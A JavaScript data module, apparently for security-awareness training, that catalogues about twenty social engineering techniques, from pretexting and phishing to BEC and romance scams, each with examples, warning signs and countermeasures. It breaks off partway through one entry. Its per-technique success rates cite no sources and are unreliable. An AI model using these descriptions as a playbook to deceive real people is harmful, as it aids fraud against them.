// Social Engineering Data Module
// Comprehensive reference for social engineering techniques, psychology, and case studies

const SE_TECHNIQUES = [
  {
    name: "Pretexting",
    category: "Human Interaction",
    description: "Pretexting involves creating a fabricated scenario or identity to engage a target and extract information or gain access. The attacker researches the target organization, learns internal jargon, org charts, and procedures, then contacts the victim while posing as a co-worker, vendor, or authority figure. The pretext is carefully constructed to seem plausible and to give the attacker a believable reason for requesting sensitive data. Unlike simple lying, pretexting requires sustained role-playing and often multiple interactions to build trust before the actual exploitation occurs.",
    realWorldExamples: [
      "An attacker calls the IT help desk posing as a new employee who has forgotten their password, providing just enough personal details gleaned from LinkedIn to pass identity verification.",
      "A social engineer poses as an auditor from a regulatory body, requesting access to financial records by citing a fabricated compliance review deadline.",
      "An attacker impersonates a building maintenance worker and gains physical access to server rooms by referencing a fake work order number."
    ],
    indicators: [
      "Caller cannot verify their identity through standard channels",
      "Unusual urgency to bypass normal verification procedures",
      "Requests for information outside the caller's stated role",
      "Inconsistencies in the backstory when pressed for details",
      "Reluctance to provide callback numbers or references"
    ],
    countermeasures: [
      "Implement strict identity verification procedures for all requests",
      "Train employees to verify identities through independent channels",
      "Establish callback procedures using known, verified phone numbers",
      "Create a culture where questioning requests is encouraged, not punished",
      "Log and audit all access requests for anomaly detection"
    ],
    difficulty: "intermediate",
    estimatedSuccessRate: "40-60%"
  },
  {
    name: "Email Phishing",
    category: "Digital",
    description: "Email phishing is the practice of sending fraudulent emails that appear to originate from a reputable source in order to steal credentials, financial information, or deliver malware. These campaigns are typically sent in bulk to thousands or millions of recipients, relying on volume rather than precision. The emails often mimic legitimate communications from banks, cloud services, or e-commerce platforms, and direct victims to convincing replica websites where they unknowingly submit their credentials. Modern phishing kits can be purchased on dark web marketplaces for as little as a few dollars, dramatically lowering the barrier to entry for attackers.",
    realWorldExamples: [
      "Mass emails impersonating Microsoft Office 365, warning users their account will be suspended unless they verify their credentials immediately via a provided link.",
      "Fake shipping notification emails from carriers like FedEx or UPS containing links to credential harvesting pages or malware-laden attachments.",
      "Emails posing as the IRS during tax season, claiming a refund is available and directing recipients to enter their Social Security number and banking details."
    ],
    indicators: [
      "Sender address does not match the claimed organization's domain",
      "Generic greetings such as 'Dear Customer' instead of the recipient's name",
      "Urgent language demanding immediate action",
      "Hyperlinks that do not match the displayed text when hovered",
      "Poor grammar, spelling errors, or inconsistent formatting"
    ],
    countermeasures: [
      "Deploy email filtering with anti-phishing capabilities",
      "Implement DMARC, DKIM, and SPF records for organizational domains",
      "Conduct regular phishing awareness training and simulations",
      "Enable multi-factor authentication on all accounts",
      "Use browser-based anti-phishing extensions and URL reputation services"
    ],
    difficulty: "beginner",
    estimatedSuccessRate: "3-5%"
  },
  {
    name: "Spear Phishing",
    category: "Digital",
    description: "Spear phishing is a targeted form of phishing directed at specific individuals or organizations. Unlike mass phishing campaigns, spear phishing emails are carefully crafted using information gathered from social media, corporate websites, and data breaches to make the message highly relevant and convincing to the recipient. The attacker may reference real projects, colleagues, or recent events to establish credibility. Because of this personalization, spear phishing has a significantly higher success rate than generic phishing and is the primary initial access vector used in advanced persistent threat (APT) campaigns.",
    realWorldExamples: [
      "An attacker sends a tailored email to a defense contractor employee referencing a real conference they attended, with a malicious PDF disguised as the conference proceedings.",
      "A finance department employee receives an email apparently from their CFO, referencing a real acquisition deal, asking them to review an attached spreadsheet that contains a macro-based payload.",
      "A researcher receives an email from what appears to be a journal editor, referencing their recent publication and asking them to review a paper -- the attached document exploits a zero-day vulnerability."
    ],
    indicators: [
      "Email references specific personal or professional details",
      "Sender address is a close misspelling of a known contact's address",
      "Attachment or link is unexpected despite the email seeming legitimate",
      "The request deviates slightly from established procedures",
      "Email arrives at an unusual time for the supposed sender"
    ],
    countermeasures: [
      "Limit personal and organizational information shared publicly",
      "Implement email authentication protocols (SPF, DKIM, DMARC)",
      "Deploy advanced threat protection with sandbox analysis for attachments",
      "Train high-value targets to verify unexpected requests through a separate channel",
      "Use data loss prevention tools to detect and block exfiltration attempts"
    ],
    difficulty: "intermediate",
    estimatedSuccessRate: "30-50%"
  },
  {
    name: "Whaling",
    category: "Digital",
    description: "Whaling is a highly targeted phishing attack aimed at senior executives, board members, and other high-profile individuals within an organization. These attacks are meticulously researched and crafted to appear as critical business communications such as legal subpoenas, executive complaints, or high-priority business deals. The stakes are considerably higher because executives typically have elevated access privileges and authority to approve large financial transactions. Whaling emails often avoid the hallmarks of typical phishing such as malicious attachments, instead directing targets to credential-harvesting websites or making requests that exploit the executive's authority within the organization.",
    realWorldExamples: [
      "A CEO receives what appears to be a legal subpoena requiring them to click a link to view court documents, which leads to a credential harvesting page mimicking their corporate SSO portal.",
      "A CFO receives an email apparently from the company's legal counsel regarding a confidential acquisition, requesting an urgent wire transfer to escrow.",
      "A board member receives a fake board meeting agenda document that exploits a document viewer vulnerability to install a remote access trojan."
    ],
    indicators: [
      "Communication appears to be from legal counsel, regulators, or law enforcement",
      "Unusual financial requests involving large sums or new accounts",
      "High urgency combined with confidentiality requests",
      "Sender domain is slightly different from the legitimate domain",
      "Request bypasses normal financial approval workflows"
    ],
    countermeasures: [
      "Provide specialized security awareness training for executives",
      "Implement multi-person authorization for large financial transactions",
      "Establish out-of-band verification procedures for sensitive requests",
      "Deploy advanced email security with executive impersonation detection",
      "Limit publicly available information about executives' activities and schedules"
    ],
    difficulty: "advanced",
    estimatedSuccessRate: "20-40%"
  },
  {
    name: "Vishing",
    category: "Voice",
    description: "Vishing (voice phishing) uses phone calls to manipulate targets into divulging sensitive information or performing actions that compromise security. Attackers may spoof caller ID to appear as a trusted entity such as a bank, government agency, or internal IT department. Modern vishing attacks increasingly leverage AI-generated voice deepfakes to clone the voices of known individuals, making them extremely difficult to detect. Vishing is particularly effective because the real-time nature of phone conversations puts pressure on victims to respond immediately without time to verify the request, and vocal cues like tone and urgency are powerful manipulation tools.",
    realWorldExamples: [
      "Attackers call employees posing as the IT help desk during a supposed system migration, asking them to provide their current passwords so accounts can be transferred to the new system.",
      "A scammer calls elderly individuals claiming to be from the Social Security Administration, stating their SSN has been compromised and demanding immediate payment to prevent arrest.",
      "Fraudsters use AI voice cloning to impersonate a CEO's voice, calling the finance department to authorize an emergency wire transfer to an overseas account."
    ],
    indicators: [
      "Caller creates extreme urgency or threatens negative consequences",
      "Requests for passwords, PINs, or one-time codes over the phone",
      "Caller ID shows a known organization but the request is unusual",
      "Caller becomes aggressive or evasive when asked verification questions",
      "Unsolicited calls requesting sensitive personal or financial information"
    ],
    countermeasures: [
      "Never provide sensitive information to inbound callers",
      "Hang up and call back using an independently verified number",
      "Establish verbal authentication codes for sensitive phone transactions",
      "Implement AI-based voice analysis to detect synthesized speech",
      "Train employees to recognize common vishing scripts and pressure tactics"
    ],
    difficulty: "intermediate",
    estimatedSuccessRate: "25-45%"
  },
  {
    name: "Smishing",
    category: "Digital",
    description: "Smishing (SMS phishing) exploits text messages to deliver malicious links or extract sensitive information from targets. This technique takes advantage of the inherent trust people place in text messages and the limited screen real estate of mobile devices, which makes it harder to inspect URLs before clicking. Smishing messages often impersonate banks, delivery services, or government agencies, and may leverage URL shorteners to obscure the true destination of links. The rise of RCS and iMessage has expanded smishing capabilities, allowing attackers to send richer content that more convincingly mimics legitimate business communications.",
    realWorldExamples: [
      "A text message claims to be from the US Postal Service with a tracking link for a package that requires additional delivery fees, directing victims to a credit card harvesting site.",
      "Bank impersonation texts warn of suspicious account activity and direct recipients to a phishing page that captures banking credentials and two-factor authentication codes.",
      "COVID-19 themed smishing messages offered links to schedule vaccine appointments, leading to pages that harvested personal health information and Social Security numbers."
    ],
    indicators: [
      "Text from an unknown number claiming to be a known organization",
      "Shortened URLs that obscure the actual destination",
      "Requests to click links to resolve account issues",
      "Messages creating urgency about deliveries, payments, or account suspensions",
      "Texts requesting personal information or payment via unconventional methods"
    ],
    countermeasures: [
      "Never click links in unsolicited text messages",
      "Contact organizations directly using official apps or websites",
      "Enable spam filtering on mobile devices",
      "Report suspicious messages to carriers by forwarding to 7726 (SPAM)",
      "Use mobile security software that scans links in text messages"
    ],
    difficulty: "beginner",
    estimatedSuccessRate: "5-15%"
  },
  {
    name: "QR Phishing (Quishing)",
    category: "Digital",
    description: "QR phishing, or quishing, involves embedding malicious URLs in QR codes that redirect victims to credential-harvesting websites, trigger malware downloads, or initiate unauthorized actions. This technique has surged in prevalence as QR codes became ubiquitous during the COVID-19 pandemic for contactless menus, payments, and check-ins. Attackers exploit the fact that QR codes are opaque to human inspection -- users cannot see the destination URL before scanning. Physical quishing involves placing malicious QR code stickers over legitimate ones in public places, while digital quishing embeds malicious QR codes in emails to bypass traditional URL-scanning email security tools that do not analyze images.",
    realWorldExamples: [
      "Attackers placed fraudulent QR code stickers on parking meters in major US cities, directing users to fake payment sites that stole credit card information.",
      "Phishing emails containing QR codes instead of clickable links bypassed corporate email security filters, directing employees to fake Microsoft 365 login pages.",
      "Malicious QR codes on fake cryptocurrency ATM screens redirected payments to attacker-controlled wallets."
    ],
    indicators: [
      "QR codes received via email, especially from unknown senders",
      "QR code stickers placed over existing codes in public spaces",
      "QR codes that redirect to login pages or payment forms",
      "Unsolicited QR codes in physical mail or on flyers",
      "QR codes that trigger automatic downloads on mobile devices"
    ],
    countermeasures: [
      "Use QR scanner apps that preview URLs before opening them",
      "Inspect physical QR codes for signs of tampering or sticker overlays",
      "Never scan QR codes from untrusted email sources",
      "Implement email security solutions that can analyze QR codes within images",
      "Educate users about quishing risks and safe QR code practices"
    ],
    difficulty: "beginner",
    estimatedSuccessRate: "10-25%"
  },
  {
    name: "Baiting",
    category: "Physical/Digital",
    description: "Baiting leverages human curiosity or greed by offering something enticing to lure victims into a trap. In physical baiting, attackers leave malware-infected USB drives, CDs, or other media in locations where target employees are likely to find them, such as parking lots, lobbies, or restrooms. The devices are often labeled with intriguing titles like 'Confidential - Salary Data' or 'Q4 Layoff Plans' to increase the likelihood someone will plug them into a corporate computer. Digital baiting offers free software, movies, music, or other desirable downloads that are bundled with malware. The technique exploits the natural human tendency to want something for free or to satisfy curiosity.",
    realWorldExamples: [
      "During a penetration test of a financial institution, USB drives labeled 'Executive Bonus Structure 2024' were dropped in the employee parking garage. Over 60% were plugged into corporate workstations within 24 hours.",
      "Attackers scattered USB drives loaded with custom malware near the entrance of a defense contractor's facility, successfully compromising several classified workstations.",
      "A malicious website offered free premium versions of popular software tools, bundling them with keyloggers and remote access trojans that exfiltrated corporate credentials."
    ],
    indicators: [
      "Found USB drives or storage media in public or semi-public areas",
      "Free software or media offered from unofficial or suspicious sources",
      "Labels designed to provoke curiosity or imply confidential content",
      "Offers that seem too good to be true",
      "Unexpected physical media received in the mail"
    ],
    countermeasures: [
      "Implement USB device control policies that block unauthorized removable media",
      "Train employees to report found devices to security rather than connecting them",
      "Use endpoint protection that scans removable media automatically",
      "Deploy USB data diodes or air-gapped analysis workstations for unknown devices",
      "Establish clear policies against downloading unauthorized software"
    ],
    difficulty: "beginner",
    estimatedSuccessRate: "40-60%"
  },
  {
    name: "Tailgating",
    category: "Physical",
    description: "Tailgating, also known as piggybacking, is a physical social engineering technique where an unauthorized person follows an authorized individual through a secured entry point. The attacker typically waits near a badge-controlled door and follows closely behind an employee who has just used their access card. Social norms of politeness are exploited, as most people will hold a door open for someone who appears to be a colleague, especially if the attacker is carrying boxes, coffee, or other items that make it seem natural to need door-holding help. Tailgating is one of the simplest yet most effective physical security bypasses and can provide access to restricted areas, server rooms, and sensitive facilities.",
    realWorldExamples: [
      "A penetration tester wearing a delivery uniform and carrying several boxes approached a secured entrance, and an employee held the door open without questioning their identity or access authorization.",
      "An attacker dressed in business attire followed a group of employees returning from lunch through a badge-controlled entrance, blending in with the crowd.",
      "A social engineer carrying a laptop bag and appearing to struggle with a phone call followed employees into a data center by timing their approach to coincide with shift changes."
    ],
    indicators: [
      "Individuals following closely behind authorized personnel at secured entrances",
      "People asking to hold the door or requesting someone to badge them in",
      "Unfamiliar faces in restricted areas without visible identification badges",
      "Individuals carrying items that might elicit door-holding courtesy",
      "People lingering near secured entrances waiting for someone to open the door"
    ],
    countermeasures: [
      "Install mantrap or airlock-style entrance systems that allow only one person per badge swipe",
      "Deploy security guards or reception staff at building entrances",
      "Implement a strict policy requiring all visitors to sign in and be escorted",
      "Train employees to politely challenge unfamiliar individuals and report tailgating",
      "Use turnstiles or speed gates that enforce single-person entry per credential"
    ],
    difficulty: "beginner",
    estimatedSuccessRate: "50-70%"
  },
  {
    name: "Quid Pro Quo",
    category: "Human Interaction",
    description: "Quid pro quo attacks involve an attacker offering a service, favor, or benefit in exchange for information or access. Unlike baiting, which offers a passive enticement, quid pro quo requires active interaction where the attacker provides something of perceived value to the target. A common scenario involves an attacker calling random extensions at a company, posing as technical support, and offering to help with computer problems. When they find someone who actually has a technical issue, they guide the victim through steps that install malware or expose credentials, ostensibly as part of the troubleshooting process. The technique exploits the psychological principle of reciprocity.",
    realWorldExamples: [
      "Attackers cold-called employees claiming to be from IT support, offering to fix a slow computer issue. Victims who accepted were guided to install a remote access tool that gave the attacker persistent access.",
      "A social engineer offered free USB security tokens at a trade show, but the tokens contained firmware-level keyloggers that captured credentials when plugged into corporate laptops.",
      "Researchers posed as IT consultants offering free security assessments to small businesses, using the access to map internal networks and identify vulnerabilities for later exploitation."
    ],
    indicators: [
      "Unsolicited offers of technical assistance from unknown callers",
      "Requests to install software or grant remote access as part of free help",
      "Offers of free services that require access to corporate systems",
      "Callers who seem to know about existing technical problems",
      "Help that requires bypassing security controls or providing credentials"
    ],
    countermeasures: [
      "Verify the identity of anyone offering unsolicited technical assistance",
      "Establish official IT support channels and communicate them to all employees",
      "Implement policies against installing unauthorized software or granting remote access",
      "Train employees to be suspicious of unsolicited help offers",
      "Log and review all remote access sessions"
    ],
    difficulty: "intermediate",
    estimatedSuccessRate: "30-50%"
  },
  {
    name: "Watering Hole Attack",
    category: "Digital",
    description: "A watering hole attack targets a specific group of users by compromising websites they are known to visit regularly. Rather than attacking the target directly, the attacker identifies websites frequented by members of the target organization or industry, then injects malicious code into those sites. When target users visit the compromised site, they are served exploits or malware, often through drive-by download techniques. This approach is particularly effective against well-defended organizations because it circumvents perimeter security by exploiting trust in third-party websites. The name derives from predators in nature that ambush prey at watering holes.",
    realWorldExamples: [
      "The Nitro Gang compromised a popular industrial control systems (ICS) forum website, serving a zero-day exploit to visitors from energy and chemical companies to install Poison Ivy RAT.",
      "Attackers compromised the website of the Polish Financial Supervision Authority, targeting banks by injecting malicious JavaScript that redirected specific IP ranges to exploit kits.",
      "A supply chain attack compromised a popular developer tool's update server, distributing backdoored updates to thousands of software development organizations."
    ],
    indicators: [
      "Browser exploits triggered when visiting normally safe websites",
      "Unexpected downloads or redirects from trusted industry websites",
      "Security tools flagging known-good websites as compromised",
      "Multiple employees reporting similar malware infections after visiting the same site",
      "JavaScript injection or iframe modifications on trusted web properties"
    ],
    countermeasures: [
      "Keep browsers and plugins fully patched and up to date",
      "Use browser isolation technology for web browsing",
      "Deploy network-based intrusion detection that inspects web traffic",
      "Implement application whitelisting to prevent unauthorized code execution",
      "Monitor DNS and proxy logs for indicators of compromise on frequented sites"
    ],
    difficulty: "advanced",
    estimatedSuccessRate: "15-30%"
  },
  {
    name: "Honey Trap",
    category: "Human Interaction",
    description: "A honey trap is a social engineering technique where an attacker uses a romantic or sexual relationship to extract information from a target. This technique has been used extensively in espionage throughout history and has evolved into the digital age through dating apps, social media, and professional networking platforms. The attacker builds a relationship with the target, establishing emotional trust and intimacy, then leverages that relationship to extract sensitive information, recruit the target as an insider, or compromise them through blackmail. Corporate espionage variants may involve befriending employees at industry events or through online professional communities to gain access to trade secrets or competitive intelligence.",
    realWorldExamples: [
      "A foreign intelligence operative created a fake profile on a dating app and targeted defense industry employees, developing relationships over months before requesting information about classified programs.",
      "An attacker created a fictitious female persona on LinkedIn, connecting with male employees at a cybersecurity firm. After building rapport through extended messaging, they sent malicious documents disguised as personal photos.",
      "An insider threat case involved an employee who was recruited by a competitor's agent through a romantic relationship established at an industry conference, leading to the theft of proprietary source code."
    ],
    indicators: [
      "New romantic interests who show unusual curiosity about work details",
      "Online connections who quickly escalate intimacy while asking about professional matters",
      "Relationships that seem to coincidentally align with access to sensitive projects",
      "Partners who pressure for work-from-home arrangements or access to work devices",
      "Contacts met at professional events who steer conversations toward proprietary information"
    ],
    countermeasures: [
      "Implement insider threat awareness programs covering honey trap scenarios",
      "Require reporting of foreign national contacts for personnel with security clearances",
      "Establish clear policies about discussing work details with non-authorized individuals",
      "Train employees to recognize suspicious interest patterns in new relationships",
      "Use counterintelligence briefings for employees in sensitive positions"
    ],
    difficulty: "advanced",
    estimatedSuccessRate: "30-50%"
  },
  {
    name: "Dumpster Diving",
    category: "Physical",
    description: "Dumpster diving involves searching through an organization's or individual's discarded materials to find information that can be used for social engineering or direct exploitation. Trash and recycling bins can yield a wealth of useful data including organizational charts, phone directories, technical manuals, system printouts, discarded hard drives, sticky notes with passwords, and even shredded documents that can be reconstructed. This seemingly low-tech approach remains surprisingly effective because many organizations fail to properly destroy sensitive documents and media before disposal. Information gathered through dumpster diving often serves as the foundation for more sophisticated social engineering attacks.",
    realWorldExamples: [
      "A penetration tester recovered un-shredded copies of the employee directory, internal phone extensions, and a network diagram from a financial firm's recycling dumpster, enabling a successful vishing campaign.",
      "Investigators found that identity thieves had been systematically collecting discarded bank statements, pre-approved credit card offers, and tax documents from residential recycling bins.",
      "An attacker recovered discarded hard drives from a hospital's e-waste bin that contained unencrypted patient records, which were then used for insurance fraud and blackmail."
    ],
    indicators: [
      "Unfamiliar individuals near dumpsters or recycling areas during off-hours",
      "Missing bags from secured waste containers",
      "Tampered shred bins or cross-cut shredder bypass",
      "Reports of sensitive documents found outside of secure disposal channels",
      "Unauthorized individuals near loading docks or waste collection areas"
    ],
    countermeasures: [
      "Implement a clean desk policy and enforce it through regular audits",
      "Use cross-cut or micro-cut shredders for all sensitive documents",
      "Deploy locked, secure bins for documents awaiting destruction",
      "Contract with certified document destruction services",
      "Degauss, physically destroy, or securely wipe all storage media before disposal"
    ],
    difficulty: "beginner",
    estimatedSuccessRate: "40-60%"
  },
  {
    name: "Shoulder Surfing",
    category: "Physical",
    description: "Shoulder surfing is the practice of observing someone's screen, keyboard, or documents to capture sensitive information such as passwords, PINs, credit card numbers, or confidential data. This can be done through direct observation from a nearby vantage point or using optical aids such as binoculars, miniature cameras, or even smartphone cameras from a distance. The technique is commonly employed in public places like airports, coffee shops, ATMs, and shared workspaces where people frequently access sensitive accounts. With the rise of remote work and public Wi-Fi usage, shoulder surfing has become an increasingly relevant threat vector.",
    realWorldExamples: [
      "During a security assessment, an operative positioned in an airport business lounge captured VPN credentials, email passwords, and confidential documents from nearby travelers using a smartphone camera with a telephoto lens.",
      "ATM skimming operations frequently incorporate hidden cameras positioned to record PIN entries while a separate device captures card data from the card reader.",
      "A corporate espionage case involved an operative who repeatedly sat near a target executive in a hotel lobby, photographing their laptop screen during video conferences about an upcoming merger."
    ],
    indicators: [
      "Individuals positioned to observe screens or keyboards",
      "People using cameras or phones in ways that could capture screen content",
      "Strangers lingering near ATMs or payment terminals",
      "Mirrors or reflective surfaces positioned to enable observation",
      "Unfamiliar devices attached near screens or keyboards"
    ],
    countermeasures: [
      "Use privacy screens on laptops and mobile devices",
      "Shield PIN pads with your hand when entering codes",
      "Position screens away from windows and high-traffic areas",
      "Use biometric authentication instead of typed passwords where possible",
      "Be aware of surroundings when accessing sensitive information in public"
    ],
    difficulty: "beginner",
    estimatedSuccessRate: "20-40%"
  },
  {
    name: "Impersonation",
    category: "Human Interaction",
    description: "Impersonation is the act of assuming the identity of another person to gain unauthorized access, extract information, or perform fraudulent actions. This can involve physical impersonation by wearing uniforms, carrying fake credentials, or assuming mannerisms of specific roles such as delivery personnel, maintenance workers, IT technicians, or executives. Digital impersonation includes creating fake social media profiles, spoofing email addresses, or registering look-alike domains. Impersonation is often the foundational technique underlying many other social engineering attacks and can be enhanced with deepfake audio and video technology, which makes detection increasingly difficult.",
    realWorldExamples: [
      "A penetration tester impersonated a fire inspector, gaining unrestricted access to a corporate headquarters by wearing a uniform, carrying a clipboard, and referencing a fabricated inspection schedule.",
      "Attackers created a deepfake video of a company's CFO and used it in a video conference call to authorize a wire transfer of over $25 million to fraudulent accounts.",
      "A social engineer posed as an employee from the corporate IT department at a retail chain, visiting multiple store locations to install keyloggers on point-of-sale systems."
    ],
    indicators: [
      "Visitors without proper identification or badges",
      "Individuals whose behavior does not match their claimed role",
      "Requests that deviate from normal procedures for the impersonated role",
      "Inability to answer detailed questions about their supposed department or manager",
      "Reluctance to wait for verification or escort"
    ],
    countermeasures: [
      "Require government-issued ID verification for all non-employee visitors",
      "Implement visitor management systems with photo badges",
      "Verify service calls with the dispatching company before granting access",
      "Train reception and security staff to recognize impersonation tactics",
      "Use callback verification for any phone-based requests from authority figures"
    ],
    difficulty: "intermediate",
    estimatedSuccessRate: "35-55%"
  },
  {
    name: "Business Email Compromise (BEC)",
    category: "Digital",
    description: "Business Email Compromise is a sophisticated scam targeting organizations that regularly perform wire transfers or handle sensitive financial transactions. Attackers gain access to or convincingly spoof a business email account, then use it to redirect legitimate payments, request fraudulent transfers, or steal sensitive business data. BEC attacks rely heavily on social engineering rather than technical exploits, leveraging compromised or spoofed email accounts of executives, finance personnel, or vendors. The FBI's Internet Crime Complaint Center has consistently identified BEC as the costliest form of cybercrime, with losses exceeding billions of dollars annually worldwide.",
    realWorldExamples: [
      "Attackers compromised a real estate attorney's email account and monitored communications about a pending home sale. At the time of closing, they sent modified wire transfer instructions to the buyer, diverting the payment to their own account.",
      "A multinational corporation's accounts payable department received an email from a compromised vendor email account with updated banking details. Over $30 million in payments were redirected before the fraud was detected.",
      "An attacker registered a domain nearly identical to a supplier's domain, then sent invoices with modified bank account numbers to the supplier's customers."
    ],
    indicators: [
      "Unexpected changes to payment instructions or banking details",
      "Emails requesting wire transfers that bypass normal approval processes",
      "Slight variations in email addresses or domain names",
      "Urgency or secrecy emphasized in financial transaction requests",
      "Requests to change direct deposit or payroll routing information"
    ],
    countermeasures: [
      "Implement multi-person approval for wire transfers and payment changes",
      "Verify any changes to payment details through a separate communication channel",
      "Deploy email authentication (DMARC/DKIM/SPF) and advanced anti-spoofing tools",
      "Monitor for look-alike domain registrations targeting the organization",
      "Establish a verbal confirmation protocol for transactions above a defined threshold"
    ],
    difficulty: "intermediate",
    estimatedSuccessRate: "25-40%"
  },
  {
    name: "CEO Fraud",
    category: "Digital",
    description: "CEO fraud is a specific variant of business email compromise where an attacker impersonates a chief executive officer or other C-suite executive to request urgent financial transactions from employees, typically in the finance or accounting department. The attacker exploits the authority gradient within organizations, knowing that employees are often reluctant to question or delay requests that appear to come from senior leadership. These attacks are carefully timed to coincide with periods when the impersonated executive is known to be traveling or otherwise unavailable for immediate verification, such as during international trips, conferences, or after business hours.",
    realWorldExamples: [
      "The finance director of a European aerospace company received an email appearing to be from the CEO, requesting a confidential transfer of 42 million euros for a purported secret acquisition. The money was wired to accounts in China.",
      "An attacker impersonating a CEO sent an email to the HR director requesting W-2 tax forms for all employees, resulting in the exposure of personal data for thousands of workers.",
      "A CFO received an email from what appeared to be the CEO's personal email account, requesting an urgent wire transfer while the real CEO was on a transatlantic flight and unreachable."
    ],
    indicators: [
      "Financial requests from executives sent outside normal business hours",
      "Emphasis on secrecy and urgency in the request",
      "Use of personal email accounts rather than corporate email",
      "Request to bypass standard financial controls or approval chains",
      "Reference to confidential deals or acquisitions not previously discussed"
    ],
    countermeasures: [
      "Establish out-of-band verification procedures for executive financial requests",
      "Implement dual-authorization requirements for all wire transfers",
      "Train finance and HR staff specifically on CEO fraud scenarios",
      "Create a culture where questioning senior leadership requests is acceptable",
      "Deploy email security solutions that flag external emails resembling internal addresses"
    ],
    difficulty: "intermediate",
    estimatedSuccessRate: "20-35%"
  },
  {
    name: "Invoice Fraud",
    category: "Digital",
    description: "Invoice fraud involves sending fake or modified invoices to an organization's accounts payable department, tricking them into making payments to attacker-controlled accounts. This can take several forms: completely fabricated invoices from fictitious vendors, modified legitimate invoices with altered bank details, or invoices for goods and services never ordered or delivered. Attackers research the target organization's suppliers, invoice formats, and payment procedures to create convincing forgeries. Some operations involve compromising a legitimate vendor's email account and using it to send invoices with modified payment details, making detection extremely difficult because the invoices come from the expected email address.",
    realWorldExamples: [
      "A Lithuanian national defrauded Google and Facebook of over $100 million by impersonating a legitimate hardware manufacturer and sending fake invoices for goods and services that were actually provided by the real company.",
      "Attackers compromised the email system of a construction subcontractor and modified invoices sent to the general contractor, redirecting millions in payments to offshore accounts.",
      "A fraud ring sent small invoices (under $500) to thousands of businesses for office supplies and directory listings that were never ordered, exploiting the fact that many organizations auto-pay invoices below a review threshold."
    ],
    indicators: [
      "Invoices from new or unrecognized vendors",
      "Changes to bank account details on invoices from existing vendors",
      "Invoices that do not match purchase orders or contracts on file",
      "Pressure to pay quickly with threats of late fees or service disruption",
      "Invoices for vague services without specific delivery documentation"
    ],
    countermeasures: [
      "Implement three-way matching between purchase orders, receipts, and invoices",
      "Verify any changes to vendor banking information through established contacts",
      "Require purchase orders for all goods and services above a defined threshold",
      "Conduct regular audits of the vendor master file for unauthorized additions",
      "Deploy accounts payable automation with anomaly detection capabilities"
    ],
    difficulty: "intermediate",
    estimatedSuccessRate: "15-30%"
  },
  {
    name: "Tech Support Scam",
    category: "Voice/Digital",
    description: "Tech support scams involve attackers posing as technical support representatives from well-known technology companies such as Microsoft, Apple, or internet service providers. The scam typically begins with a cold call, pop-up browser alert, or search engine advertisement warning the victim that their computer is infected with malware or experiencing critical errors. The attacker then persuades the victim to grant remote access to their computer, where they may install actual malware, steal files, or simply charge excessive fees for unnecessary services. Some variants involve locking the victim's computer with ransomware and demanding payment for the unlock code, disguised as a legitimate support fee.",
    realWorldExamples: [
      "A criminal network operating from call centers in India generated over $10 million by cold-calling US and UK residents, claiming to be Microsoft support and charging $200-$500 for unnecessary virus removal services after gaining remote access.",
      "Pop-up browser warnings mimicking Windows security alerts instructed users to call a toll-free number. Operators then used remote access tools to install keyloggers and exfiltrate banking credentials.",
      "An FTC investigation uncovered a tech support scam ring that purchased search engine advertisements for major tech companies' support lines, intercepting legitimate support-seeking customers and charging them for fake services."
    ],
    indicators: [
      "Unsolicited calls claiming to be from tech companies about computer problems",
      "Pop-up warnings with phone numbers to call for technical assistance",
      "Requests to install remote access software like TeamViewer or AnyDesk",
      "Demands for payment via gift cards, wire transfers, or cryptocurrency",
      "Claims that your computer is sending error reports or has been compromised"
    ],
    countermeasures: [
      "Never grant remote access to unsolicited callers",
      "Contact tech support only through official channels listed on vendor websites",
      "Use ad blockers to reduce exposure to malicious search advertisements",
      "Install browser extensions that block known tech support scam domains",
      "Report tech support scams to the FTC and relevant technology companies"
    ],
    difficulty: "beginner",
    estimatedSuccessRate: "5-15%"
  },
  {
    name: "Romance Scam",
    category: "Human Interaction/Digital",
    description: "Romance scams involve creating fake online personas to develop romantic relationships with targets for the purpose of financial fraud. Attackers invest weeks or months building emotional connections through dating platforms, social media, or messaging apps before introducing financial requests. The scammer fabricates elaborate scenarios requiring money, such as medical emergencies, travel costs to visit the victim, business opportunities, or legal troubles. Modern romance scams increasingly involve cryptocurrency investment fraud (known as pig butchering), where the victim is gradually encouraged to invest in fake cryptocurrency platforms. These scams cause devastating financial and psychological damage to victims.",
    realWorldExamples: [
      "The Netflix documentary 'The Tinder Swindler' profiled a scammer who posed as the son of a diamond mogul on Tinder, defrauding multiple women of a combined $10 million through fabricated threats requiring emergency financial help.",
      "A pig butchering operation based in Southeast Asia maintained fake cryptocurrency trading platforms, using romance scam victims as investors. Individual losses exceeded $500,000 in some cases.",
      "An elderly veteran was defrauded of his life savings of $350,000 by a scammer posing as a female US Army doctor deployed overseas, requesting money for satellite phone bills, leave applications, and shipping personal items home."
    ],
    indicators: [
      "Online romantic interest who avoids video calls or in-person meetings",
      "Rapidly escalating emotional intimacy before any real-world interaction",
      "Elaborate stories explaining why they cannot meet in person",
      "Financial requests framed as temporary emergencies or investment opportunities",
      "Claims of military deployment, offshore work, or other scenarios preventing meeting"
    ],
    countermeasures: [
      "Conduct reverse image searches on profile photos of online romantic interests",
      "Never send money to someone you have not met in person",
      "Be suspicious of anyone who professes love quickly without meeting face to face",
      "Verify identities through video calls and independent verification of claimed details",
      "Consult trusted friends or family before making financial decisions in new relationships"
    ],
    difficulty: "intermediate",
    estimatedSuccessRate: "10-20%"
  },
  {
    name: "Fake Job Offer",
    category: "Digital",
    description: "Fake job offer scams exploit job seekers by presenting fraudulent employment opportunities designed to steal personal information, money, or both. Attackers post convincing job listings on legitimate platforms, create fake company websites, and conduct seemingly professional interviews. Once the victim believes they have been hired, the scammer may request sensitive personal information for onboarding (Social Security numbers, bank account details, copies of identification documents), require payment for equipment, training materials, or background checks, or use the victim as a money mule. Some sophisticated variants target specific professionals to extract trade secrets or intellectual property under the guise of pre-employment technical assessments.",
    realWorldExamples: [
      "North Korean threat actors created fake job postings and recruiter profiles on LinkedIn, targeting cryptocurrency and DeFi developers. Candidates were asked to complete coding challenges that contained backdoored npm packages, compromising their development environments.",
      "A fraud operation posted remote work opportunities requiring candidates to purchase specific equipment from a designated vendor, which was actually a shell company operated by the scammers.",
      "Scammers impersonated recruiters from major tech companies, collecting copies of passports, Social Security cards, and bank details from candidates who believed they were completing pre-employment onboarding paperwork."
    ],
    indicators: [
      "Job offers received without applying or from companies you did not contact",
      "Requests for personal financial information before employment begins",
      "Requirements to pay for equipment, training, or background checks upfront",
      "Interviews conducted entirely via text chat with no video or phone component",
      "Salary and benefits that seem unrealistically high for the position described"
    ],
    countermeasures: [
      "Research companies independently and verify job postings on official career pages",
